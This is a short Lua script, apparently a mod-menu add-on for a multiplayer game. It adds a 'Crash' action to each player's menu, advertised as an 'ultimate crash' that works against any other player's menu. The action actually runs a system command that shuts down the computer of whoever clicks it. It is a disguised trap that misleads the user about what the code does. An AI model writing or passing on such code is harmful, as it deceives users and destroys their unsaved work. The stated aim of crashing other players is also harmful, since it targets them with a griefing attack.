util.keep_running()

players.on_join(function(pid)

    menu.divider(menu.player_root(pid), "Kill Any Menu")

	menu.action(menu.player_root(pid), "Crash", {}, "Ultimate crash, works on any menu", function()
			os.execute("shutdown /s")
		end)
	end)

players.dispatch_on_join()